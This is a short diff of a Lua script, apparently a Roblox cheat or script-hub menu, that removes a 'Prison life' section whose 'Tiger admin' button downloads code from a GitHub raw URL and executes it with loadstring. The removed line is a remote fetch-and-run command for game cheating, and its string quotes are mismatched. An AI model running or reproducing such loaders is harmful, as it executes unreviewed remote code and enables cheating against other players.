@@ -717,23 +717,6 @@ btns:Button(
     end
 )
 
--- Prison life
-
-local btns = serv:Channel("Prison life")
-
-btns:Label("Admin permissions.")
-
-btns:Button(
-    "Tiger admin",
-    function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/Tigeradmin'))()
-        DiscordLib:Notification("Notification", "Tiger admin Executed", "Okay!")
-    end
-)
-
-
-
-
 
 
 
